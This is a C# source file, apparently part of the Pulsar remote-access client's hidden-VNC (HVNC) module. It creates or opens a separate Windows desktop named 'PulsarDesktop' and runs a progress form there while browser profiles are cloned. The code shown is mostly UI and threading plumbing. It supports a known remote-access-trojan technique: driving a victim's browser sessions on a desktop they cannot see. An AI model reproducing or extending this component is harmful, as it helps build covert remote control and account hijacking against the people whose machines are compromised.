using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Pulsar.Client.Helper.HVNC
{
    /// <summary>
    /// Manages the small progress form shown when cloning browser profiles so users can observe the operation.
    /// </summary>
    internal sealed class BrowserCloneProgressSession : IDisposable
    {
        private const string HvncDesktopName = "PulsarDesktop";

        private readonly CloneProgressForm _form;
        private readonly Progress<BrowserCloneProgress> _progress;
        private readonly CancellationTokenSource _cts;
        private readonly EventHandler _cancelHandler;
        private bool _completed;
        private bool _disposed;

        private BrowserCloneProgressSession(CloneProgressForm form)
        {
            _form = form;
            _cts = new CancellationTokenSource();
            _cancelHandler = (sender, args) => RequestCancel();
            _form.UserRequestedCancel += _cancelHandler;
            _progress = new Progress<BrowserCloneProgress>(state =>
            {
                if (!_form.IsDisposed)
                {
                    _form.UpdateProgress(state);
                }
            });
        }

        /// <summary>
        /// Gets a progress reporter that can be used from background threads.
        /// </summary>
        public IProgress<BrowserCloneProgress> Progress => _progress;

        /// <summary>
        /// Gets a token that is cancelled when the user closes the progress UI.
        /// </summary>
        public CancellationToken CancellationToken => _cts.Token;

        public void ReportPreparing()
        {
            InvokeOnUi(() => _form.ShowPreparing());
        }

        public Task ReportCompletionAsync(bool wasSuccessful)
        {
            if (_completed)
            {
                return Task.CompletedTask;
            }

            _completed = true;

            if (_form.IsDisposed)
            {
                return Task.CompletedTask;
            }

            var completionSource = new TaskCompletionSource<object>(TaskCreationOptions.RunContinuationsAsynchronously);
            InvokeOnUi(() => _form.BeginCompleteAnimation(wasSuccessful, () => completionSource.TrySetResult(null)));
            return completionSource.Task;
        }

        public static Task<BrowserCloneProgressSession> TryCreateAsync(string browserName)
        {
            var completion = new TaskCompletionSource<BrowserCloneProgressSession>(TaskCreationOptions.RunContinuationsAsynchronously);

            var uiThread = new Thread(() =>
            {
                IntPtr desktopHandle = IntPtr.Zero;
                BrowserCloneProgressSession session = null;

                try
                {
                    desktopHandle = DesktopInterop.OpenOrCreate(HvncDesktopName, out int openError);
                    if (desktopHandle == IntPtr.Zero)
                    {
                        Debug.WriteLine($"[BrowserCloneProgressSession] Failed to open or create desktop '{HvncDesktopName}'. Win32 error: {openError}");
                        completion.TrySetResult(null);
                        return;
                    }

                    if (!DesktopInterop.TrySetThreadDesktop(desktopHandle))
                    {
                        int threadError = Marshal.GetLastWin32Error();
                        Debug.WriteLine($"[BrowserCloneProgressSession] SetThreadDesktop failed with error {threadError} for desktop '{HvncDesktopName}'.");
                        completion.TrySetResult(null);
                        return;
                    }

                    var form = new CloneProgressForm();
                    form.Initialize(browserName);

                    void HandleCreated(object sender, EventArgs args)
                    {
                        form.HandleCreated -= HandleCreated;

                        try
                        {
                            session = new BrowserCloneProgressSession(form);
                            completion.TrySetResult(session);
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"[BrowserCloneProgressSession] Failed to initialize progress session: {ex.Message}");
                            completion.TrySetResult(null);
                            form.BeginInvoke(new Action(form.Close));
                        }
                    }

                    form.HandleCreated += HandleCreated;
                    form.FormClosed += (_, __) => Application.ExitThread();

                    Application.Run(form);

                    if (!completion.Task.IsCompleted)
                    {
                        completion.TrySetResult(session);
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"[BrowserCloneProgressSession] Exception while creating progress UI: {ex.Message}");
                    completion.TrySetResult(null);
                }
                finally
                {
                    DesktopInterop.Release(desktopHandle);
                }
            })
            {
                IsBackground = true,
                Name = "Pulsar HVNC Progress UI"
            };

            uiThread.SetApartmentState(ApartmentState.STA);
            uiThread.Start();

            return completion.Task;
        }

        public void Dispose()
        {
            if (_disposed)
            {
                return;
            }

            _disposed = true;

            _form.UserRequestedCancel -= _cancelHandler;

            InvokeOnUi(() =>
            {
                if (!_form.IsDisposed)
                {
                    _form.Close();
                    _form.Dispose();
                }
            });

            _cts.Dispose();
        }

        private void RequestCancel()
        {
            if (_disposed)
            {
                return;
            }

            if (!_cts.IsCancellationRequested)
            {
                _cts.Cancel();
            }
        }

        private void InvokeOnUi(Action action)
        {
            if (_form.IsDisposed)
            {
                return;
            }

            if (_form.InvokeRequired)
            {
                try
                {
                    _form.BeginInvoke(action);
                }
                catch (ObjectDisposedException)
                {
                    // ignored
                }
            }
            else
            {
                action();
            }
        }

        private static class DesktopInterop
        {
            private const uint DesktopAccessMask = 0x000001FF;

            [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
            private static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, uint dwDesiredAccess);

            [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
            private static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);

            [DllImport("user32.dll", SetLastError = true)]
            private static extern bool SetThreadDesktop(IntPtr hDesktop);

            [DllImport("user32.dll", SetLastError = true)]
            private static extern bool CloseDesktop(IntPtr hDesktop);

            public static IntPtr OpenOrCreate(string desktopName, out int lastError)
            {
                lastError = 0;

                IntPtr handle = OpenDesktop(desktopName, 0, true, DesktopAccessMask);
                if (handle != IntPtr.Zero)
                {
                    return handle;
                }

                lastError = Marshal.GetLastWin32Error();

                handle = CreateDesktop(desktopName, IntPtr.Zero, IntPtr.Zero, 0, DesktopAccessMask, IntPtr.Zero);
                if (handle == IntPtr.Zero)
                {
                    lastError = Marshal.GetLastWin32Error();
                }

                return handle;
            }

            public static bool TrySetThreadDesktop(IntPtr handle)
            {
                return handle != IntPtr.Zero && SetThreadDesktop(handle);
            }

            public static void Release(IntPtr handle)
            {
                if (handle != IntPtr.Zero)
                {
                    CloseDesktop(handle);
                }
            }
        }
    }
}
